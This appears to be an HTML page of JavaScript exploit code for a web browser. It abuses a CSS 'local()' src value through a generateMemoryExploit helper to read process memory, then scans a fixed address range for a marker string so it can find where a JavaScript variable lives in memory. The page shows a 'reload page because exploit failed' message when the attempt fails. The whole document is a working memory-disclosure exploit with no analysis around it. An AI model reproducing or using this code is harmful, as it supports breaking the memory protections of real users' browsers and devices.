<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>

<script>
var offsets = [];

//function readMemory(expl, address, size)
function readMemory(address, size)
{
 var expl = document.getElementById('ex' );
 expl.style.src = 'local(' +  generateMemoryExploit(address, size) + ')';
 return expl.style.src;
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len)
{
 try
 {
var temp = readMemory(search_base, search_size+6);
  // move past "local("
  var dat = temp.substr(6, search_size);
  temp=null;
  // loop searching for tag
  for (var i=0;i<(search_size*2);i+=0x10)
  {
   if (dat.charCodeAt(i/2) == pattern)
   {
    var match = 0;
    // loop next bytes for comparison
    for (var k = 0; k <(len*2); k+=0x2)
    {
     // convert to string
     if (dat.charCodeAt((i+k)/2) != exploit_data.toString().charCodeAt(k/2))
     {
      break;
     }
     // increment match
     match += 1;
    }
    // we got a complete match
    if (match == len)
    {
     // hold exploit addr
     var exploit_addr = search_base + i + 2;
     // display the exploit address
     dbg("Found " + name + " at: " + exploit_addr.toString(16));
     var cont = 0;
     if(offsets.length > 0)
     {
      for(var idx = 0;idx < offsets.length;idx+=1)
      {
       if(offsets[idx]==exploit_addr)
       {
        cont = 1;
        break;
       }
      }
      if(cont == 1)
      {
       dbg(exploit_addr.toString(16) + " is ignored.");
       cont=0;
       continue;
      }
     }
     //offsets[offsets.length] = exploit_addr;
     offsets.push(exploit_addr);
     dat=null;
     
//exp=null;
     return exploit_addr;
    }
   }
  }
  dat=null;
  //exp=null;
  var end_range = search_base+search_size;
  dbg("The string variable named " + name + " could not be located in range " + search_base.toString(16) + " - " + end_range.toString(16));
  return 0;
 } 
 catch(e) 
 {
  dbg(e);
 }
}


var MutableString = function(value) {
  this.text = value;
};
 
MutableString.prototype = {
  toString: function() {
    return this.text;
  }
};
 function init() {
var x = new MutableString(unescape("\u2F2A\u4242\u4343\u4444"));
var addr_0=findJsVariableOffset("x", x, 0x80180000, 0x8A0000, 0x2F2A, 0x4);
dbg("addr_0: 0x"+addr_0.toString(16));
x += unescape("\u4545");
x+= unescape("\u4646");
x+= unescape("\u4747");
x+= unescape("\u4848");
var addr_0=findJsVariableOffset("x", x, 0x80180000, 0x8A0000, 0x2F2A, 0x8);
dbg("addr_0: 0x"+addr_0.toString(16));
} 
</script>
</head>
<body id="BodyID" onload="init();">
  If this message appears, reload page because exploit failed!<br>
  <div id="ex" />
  <br>
  <div id="log"></div>
 </body>
</html>